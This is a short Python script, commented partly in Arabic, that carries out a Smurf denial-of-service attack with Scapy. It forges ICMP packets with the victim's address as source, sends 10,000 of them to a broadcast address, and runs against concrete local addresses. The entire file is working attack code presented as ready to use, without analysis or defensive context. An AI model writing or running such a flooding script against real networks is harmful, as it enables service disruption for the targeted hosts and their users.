# Smurf Attack Script
# هذا الهجوم يستغل البث الشبكي (Broadcast) لإرسال عدد كبير من طلبات ICMP

from scapy.all import IP, ICMP, send

def smurf_attack(target_ip, broadcast_ip, count=10000):
    packet = IP(src=target_ip, dst=broadcast_ip)/ICMP()
    send(packet, count=count, verbose=False)
    print(f"[+] Sent {count} spoofed ICMP packets from {target_ip} to {broadcast_ip}")

smurf_attack("192.168.88.9", "192.168.88.255")